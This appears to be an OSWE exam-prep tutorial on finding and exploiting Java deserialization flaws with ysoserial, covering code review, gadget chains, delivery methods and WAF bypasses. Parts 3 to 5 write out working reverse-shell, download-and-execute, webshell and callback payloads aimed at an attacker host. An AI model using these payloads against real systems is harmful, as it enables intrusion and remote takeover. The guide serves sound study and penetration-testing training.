# Java Deserialization Methodology Guide

**Target Audience**: OSWE exam candidates
**Focus**: White-box code review + Black-box exploitation
**Time to Master**: 8-12 hours of lab work

---

## Overview

Java deserialization vulnerabilities occur when an application deserializes untrusted data without proper validation. Attackers can craft malicious serialized objects that execute arbitrary code when deserialized, leading to Remote Code Execution (RCE).

**Key Concept**: Gadget chains are sequences of method calls triggered during deserialization that ultimately invoke dangerous methods like `Runtime.exec()`.

---

## Part 1: Identifying Deserialization in Java Applications

### 1.1 Source Code Patterns (White-box)

**Critical Functions to Search For**:
```bash
# Search for deserialization entry points
grep -r "ObjectInputStream" .
grep -r "readObject()" .
grep -r "readUnshared()" .
grep -r "XMLDecoder" .
grep -r "XStream" .
grep -r "ObjectMapper.readValue" . # Jackson
```

**Vulnerable Code Pattern**:
```java
// VULNERABLE - No validation
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject(); // Code execution can happen HERE

// Also vulnerable - Custom readObject with no validation
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ois.defaultReadObject(); // Dangerous
}
```

**Safe Code Pattern**:
```java
// SAFE - Whitelist validation
class SafeObjectInputStream extends ObjectInputStream {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException {
        // Whitelist approach
        if (!ALLOWED_CLASSES.contains(desc.getName())) {
            throw new InvalidClassException("Unauthorized deserialization attempt");
        }
        return super.resolveClass(desc);
    }
}
```

### 1.2 Common Vulnerable Endpoints

| Endpoint Type | Example | Detection Method |
|---------------|---------|------------------|
| RMI Services | Port 1099, 1090 | `nmap -p 1099 target` |
| JMX Services | Port 9999 | `nmap -p 9999 target` |
| Jenkins CLI | Port 50000 | `nc target 50000` |
| HTTP Cookies | `JSESSIONID`, `viewstate` | Inspect cookie values for base64 |
| HTTP Parameters | `data`, `object`, `state` | Test POST parameters |
| HTTP Headers | `X-Java-Object`, `Authorization` | Custom headers |
| WebSockets | `ws://target/socket` | Binary messages |
| Message Queues | JMS, ActiveMQ | Queue listeners |

### 1.3 Black-box Identification

**Step 1: Detect Java Application**
```bash
# Check server headers
curl -I http://target/
# Look for: Tomcat, Jetty, JBoss, WebLogic, WebSphere

# Check for .jsp files
curl http://target/ | grep -i "\.jsp"

# Check for Java stack traces
curl http://target/invalid | grep -i "java.lang"
```

**Step 2: Look for Java Serialization Magic Bytes**
```bash
# Java serialization always starts with: AC ED 00 05
curl http://target/api/object | xxd | grep "aced 0005"

# Check cookies
curl -c cookies.txt http://target/
cat cookies.txt | base64 -d | xxd | grep "aced 0005"
```

**Step 3: Test for Deserialization**
```bash
# Generate innocent test payload
echo -n "test" | java -jar ysoserial.jar CommonsCollections5 "echo test" | base64 -w0

# Send and look for Java exceptions in response:
# - ClassNotFoundException
# - StreamCorruptedException
# - InvalidClassException
# - java.io.ObjectInputStream

# These indicate deserialization is happening!
```

---

## Part 2: Understanding Gadget Chains

### 2.1 What is a Gadget Chain?

A gadget chain is a sequence of existing classes (gadgets) in the application's classpath that can be chained together to achieve code execution during deserialization.

**Anatomy of a Gadget Chain**:
```
Serialized Object
    ↓
readObject() called
    ↓
Gadget 1: Entry point (e.g., AnnotationInvocationHandler)
    ↓
Gadget 2: Transition (e.g., LazyMap.get())
    ↓
Gadget 3: Transformer (e.g., ChainedTransformer)
    ↓
Gadget 4: Execution (e.g., InvokerTransformer)
    ↓
Runtime.exec("command")
```

### 2.2 ysoserial Gadget Chain Selection

**Recommended Chains by Library**:

| Library | Version | Gadget Chain | Reliability | Notes |
|---------|---------|--------------|-------------|-------|
| Commons Collections | 3.1-3.2.1 | CommonsCollections5 | ⭐⭐⭐⭐⭐ | Most reliable |
| Commons Collections | 3.1-3.2.1 | CommonsCollections6 | ⭐⭐⭐⭐⭐ | Alternative to CC5 |
| Commons Collections | 3.0-3.2.1 | CommonsCollections1 | ⭐⭐⭐⭐ | Original PoC |
| Commons Collections | 4.0 | CommonsCollections2 | ⭐⭐⭐⭐ | For CC 4.0 |
| Spring Framework | 3.0-4.2.x | Spring1 | ⭐⭐⭐⭐ | Requires Spring |
| ROME | 1.0 | ROME | ⭐⭐⭐ | RSS/Atom library |
| JDK | ≤7u21 | Jdk7u21 | ⭐⭐⭐ | No external libs |
| Commons BeanUtils | 1.9.x | CommonsCollections10 | ⭐⭐⭐ | Requires BeanUtils |

**Selection Decision Tree**:
```
Is Commons Collections in classpath?
├─ Yes, version 3.1-3.2.1 → Use CommonsCollections5 or CC6
├─ Yes, version 4.0 → Use CommonsCollections2
└─ No → Check for Spring Framework
    ├─ Yes → Use Spring1 or Spring2
    └─ No → Use Jdk7u21 or ROME (if available)
```

### 2.3 How CommonsCollections5 Works

**Simplified Code Flow**:
```java
// 1. Entry: Serialized BadAttributeValueExpException
BadAttributeValueExpException badAttr = new BadAttributeValueExpException(null);
// Sets TiedMapEntry as val

// 2. During deserialization, toString() is called
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
// toString() → getValue() → map.get()

// 3. LazyMap.get() triggers transformer
LazyMap lazyMap = LazyMap.decorate(new HashMap(), transformerChain);
// If key not present, applies transformer

// 4. ChainedTransformer executes sequence
ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
});

// Result: Runtime.getRuntime().exec("calc.exe")
```

---

## Part 3: ysoserial Usage

### 3.1 Installation
```bash
# Method 1: Download pre-built JAR
wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

# Method 2: Build from source
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn clean package -DskipTests
# Output: target/ysoserial-master-SNAPSHOT.jar
```

### 3.2 Basic Usage
```bash
# List available gadget chains
java -jar ysoserial.jar

# Generate payload
java -jar ysoserial.jar CommonsCollections5 "command here" > payload.bin

# Generate base64-encoded payload
java -jar ysoserial.jar CommonsCollections5 "whoami" | base64 -w0 > payload.b64
```

### 3.3 Command Payload Examples

**Ping Callback (Best for verification)**:
```bash
# Linux
java -jar ysoserial.jar CommonsCollections5 "ping -c 4 10.10.14.5" > ping.bin

# Windows
java -jar ysoserial.jar CommonsCollections5 "ping -n 4 10.10.14.5" > ping.bin
```

**Sleep (Time-based detection)**:
```bash
java -jar ysoserial.jar CommonsCollections5 "sleep 5" > sleep.bin
```

**DNS Callback (Out-of-band)**:
```bash
java -jar ysoserial.jar CommonsCollections5 "nslookup unique-id.burpcollaborator.net" > dns.bin
```

**Reverse Shell**:
```bash
# Bash (Linux)
java -jar ysoserial.jar CommonsCollections5 \
  "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" > shell.bin

# PowerShell (Windows)
java -jar ysoserial.jar CommonsCollections5 \
  "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\"" > shell.bin
```

**Download and Execute**:
```bash
java -jar ysoserial.jar CommonsCollections5 \
  "curl http://10.10.14.5/shell.sh | bash" > download.bin
```

**Write Webshell**:
```bash
java -jar ysoserial.jar CommonsCollections5 \
  "echo '<?php system(\$_GET[\"c\"]); ?>' > /var/www/html/shell.php" > webshell.bin
```

---

## Part 4: Exploitation Techniques

### 4.1 Delivery Methods

**Method 1: HTTP Cookie**
```bash
PAYLOAD=$(java -jar ysoserial.jar CommonsCollections5 "id" | base64 -w0)
curl http://target/app -H "Cookie: user_data=$PAYLOAD"
```

**Method 2: POST Parameter**
```bash
PAYLOAD=$(java -jar ysoserial.jar CommonsCollections5 "id" | base64 -w0)
curl -X POST http://target/app -d "object=$PAYLOAD"
```

**Method 3: Custom Header**
```bash
PAYLOAD=$(java -jar ysoserial.jar CommonsCollections5 "id" | base64 -w0)
curl http://target/app -H "X-Java-Object: $PAYLOAD"
```

**Method 4: JSON Field**
```bash
PAYLOAD=$(java -jar ysoserial.jar CommonsCollections5 "id" | base64 -w0)
curl -X POST http://target/api -H "Content-Type: application/json" \
  -d "{\"object\":\"$PAYLOAD\"}"
```

**Method 5: Direct TCP (RMI, JMX, Jenkins CLI)**
```bash
# Send raw binary payload (no base64)
java -jar ysoserial.jar CommonsCollections5 "id" | nc target 50000
```

### 4.2 Verification Techniques

**Best: Ping Callback**
```bash
# Attacker machine
sudo tcpdump -i eth0 icmp and src <TARGET_IP>

# If you see ICMP packets, RCE confirmed
```

**Alternative: DNS Callback**
```bash
# Use Burp Collaborator or your own DNS server
java -jar ysoserial.jar CommonsCollections5 \
  "nslookup $(whoami).yourserver.com"
```

**Alternative: HTTP Callback**
```bash
# Start HTTP server
python3 -m http.server 80

# Payload
java -jar ysoserial.jar CommonsCollections5 \
  "curl http://10.10.14.5/?$(whoami)"
```

**Last Resort: Sleep-based**
```bash
# Send sleep payload
time curl http://target/vuln -d "data=$PAYLOAD"

# If response takes ~5 seconds, likely successful
```

---

## Part 5: OSWE Exam Strategy

### 5.1 Code Review Workflow

**Step 1: Find Deserialization** (5 minutes)
```bash
grep -r "ObjectInputStream" src/
grep -r "\.readObject()" src/
grep -r "XMLDecoder" src/
```

**Step 2: Check Classpath** (2 minutes)
```bash
# Check pom.xml, build.gradle, or lib/ directory
grep -i "commons-collections" pom.xml
ls lib/ | grep commons-collections
```

**Step 3: Identify Entry Point** (3 minutes)
```java
// Find where untrusted data becomes ObjectInputStream
// Look for: Servlets, Controllers, Message handlers, RMI services
```

**Step 4: Trace Data Flow** (5 minutes)
```
User Input → HTTP Parameter → Controller → Service → ObjectInputStream.readObject()
```

### 5.2 Exploitation Workflow

**Step 1: Generate Test Payload** (2 minutes)
```bash
# Ping callback is fastest to verify
java -jar ysoserial.jar CommonsCollections5 "ping -c 4 $YOUR_IP" | base64 -w0
```

**Step 2: Deliver Payload** (3 minutes)
```bash
# Try most common delivery method first (POST parameter)
curl -X POST http://target/vuln -d "data=$PAYLOAD"
```

**Step 3: Verify RCE** (2 minutes)
```bash
# Check tcpdump for ICMP packets
sudo tcpdump -i tun0 icmp
```

**Step 4: Get Shell** (5 minutes)
```bash
# Generate reverse shell payload
java -jar ysoserial.jar CommonsCollections5 \
  "bash -c 'bash -i >& /dev/tcp/$YOUR_IP/4444 0>&1'" | base64 -w0

# Start listener
nc -lvnp 4444

# Deliver payload
curl -X POST http://target/vuln -d "data=$PAYLOAD"
```

**Total Time**: ~20 minutes

### 5.3 Pre-Exam Preparation

**Practice Labs**:
1. Jenkins 2.46.1 (Docker)
2. JBoss AS 5.x/6.x
3. Custom vulnerable Java app

**Checklist**:
- [ ] ysoserial.jar downloaded and tested
- [ ] Know how to generate payloads for Linux and Windows
- [ ] Practiced all delivery methods (cookie, POST, header)
- [ ] Comfortable with tcpdump for verification
- [ ] Can read Java code to identify deserialization
- [ ] Understand classpath and dependency management

---

## Part 6: Common Vulnerable Libraries

### 6.1 Must-Know Libraries

| Library | Versions | Gadget Chain | Prevalence |
|---------|----------|--------------|------------|
| Commons Collections | 3.1-3.2.1 | CC1-7 | Very High |
| Commons BeanUtils | 1.9.x | CC10 | High |
| Spring Framework | 3.x-4.2.x | Spring1-2 | Very High |
| ROME | 1.0 | ROME | Medium |
| Groovy | 1.7-2.4 | Groovy1 | Medium |
| C3P0 | 0.9.5.x | C3P0 | Low |
| JDK | ≤7u21 | Jdk7u21 | Low (outdated) |

### 6.2 Detecting Libraries in Code

**Maven (pom.xml)**:
```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version> <!-- VULNERABLE -->
</dependency>
```

**Gradle (build.gradle)**:
```gradle
compile 'commons-collections:commons-collections:3.2.1' // VULNERABLE
```

**Manual (lib/ directory)**:
```bash
ls lib/commons-collections-*.jar
# commons-collections-3.2.1.jar → VULNERABLE
```

---

## Part 7: Bypasses and Advanced Techniques

### 7.1 WAF Bypasses

**Double Encoding**:
```bash
java -jar ysoserial.jar CommonsCollections5 "id" | base64 | base64
```

**Compression**:
```bash
java -jar ysoserial.jar CommonsCollections5 "id" | gzip | base64
```

**Alternate Gadget Chains**:
```bash
# If CommonsCollections blocked, try:
java -jar ysoserial.jar Spring1 "id"
java -jar ysoserial.jar ROME "id"
```

### 7.2 Blind Exploitation

When you can't see responses:
1. Use ping callbacks (ICMP)
2. Use DNS callbacks (Burp Collaborator)
3. Use HTTP callbacks (your server)
4. Use sleep-based timing attacks

---

## Part 8: Quick Reference

### Code Review Checklist
- [ ] Search for `ObjectInputStream`
- [ ] Search for `readObject()`
- [ ] Check for Commons Collections in dependencies
- [ ] Identify where untrusted data is deserialized
- [ ] Check if deserialization has validation/whitelist

### Exploitation Checklist
- [ ] ysoserial ready
- [ ] Generated test payload (ping)
- [ ] tcpdump running
- [ ] Tried all delivery methods (cookie, POST, header)
- [ ] Tried multiple gadget chains
- [ ] Verified RCE via callback

### Common Mistakes
- ❌ Forgetting to base64-encode for HTTP delivery
- ❌ Using wrong gadget chain for library version
- ❌ Not URL-encoding base64 payload
- ❌ Firewall blocking callbacks
- ❌ Wrong Java serialization format

---

## References

- **ysoserial**: https://github.com/frohoff/ysoserial
- **Java Deserialization Cheat Sheet**: https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
- **Marshalsec**: https://github.com/mbechler/marshalsec
- **JEP 290**: https://openjdk.java.net/jeps/290 (Deserialization Filtering)
- **OWASP**: https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
